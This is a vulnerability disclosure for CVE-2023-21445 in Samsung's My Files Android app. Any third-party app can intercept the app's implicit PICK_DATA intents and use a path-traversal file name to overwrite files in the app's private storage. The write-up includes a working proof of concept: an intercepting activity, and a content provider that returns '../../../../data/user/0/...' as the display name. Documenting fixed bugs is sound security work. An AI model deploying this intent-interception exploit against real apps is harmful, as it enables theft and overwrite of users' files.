# Details

<table>
    <tr>
        <td>Name</td>
        <td>My Files</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.myfiles</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.30</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.02.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21445">CVE-2023-21445</a> (SVE-2022-2398)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1050</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/126.%20My%20Files%20—%20Theft%20and%20overwrite%20of%20arbitrary%20files/Oversecured_report.png)

Oversecured found the My Files app launching implicit intents with the `com.sec.android.app.myfiles.PICK_DATA` action. They can be intercepted by any third-party apps installed on the same device. As seen in the screenshots from Oversecured, the app copies content from arbitrary URIs received in `Activity.onActivityResult()` to the `/sdcard/Download` directory. The attacker can also control the file name via the `_display_name` parameter, which is vulnerable to path-traversal.

**Proof of Concept**

This vulnerability is reproducible by opening `Network Storage` -> `+` -> `SFTP server` -> `Sign-in method` -> `Private key` -> `+`.

This code creates the `/data/user/0/com.sec.android.app.myfiles/test.txt` file with `test` contents.

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.sec.android.app.myfiles.PICK_DATA" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```
```xml
<provider android:name=".MyContentProvider" android:authorities="poc.provider" android:exported="true" />
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setResult(-1, new Intent().setData(Uri.parse("content://poc.provider/xyz")));
    finish();
}
```

File `MyContentProvider.java`:
```java
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{"../../../../data/user/0/com.sec.android.app.myfiles/test.txt"});
    return matrixCursor;
}

public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    try {
        return getContext().getAssets().openFd("test.txt").getParcelFileDescriptor();
    } catch (IOException e) {
        throw new FileNotFoundException(e.getMessage());
    }
}
```

## References

- [Oversecured Blog. Android security checklist: theft of arbitrary files. Implicit intents](https://blog.oversecured.com/Android-security-checklist-theft-of-arbitrary-files/#exported-providers)
- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
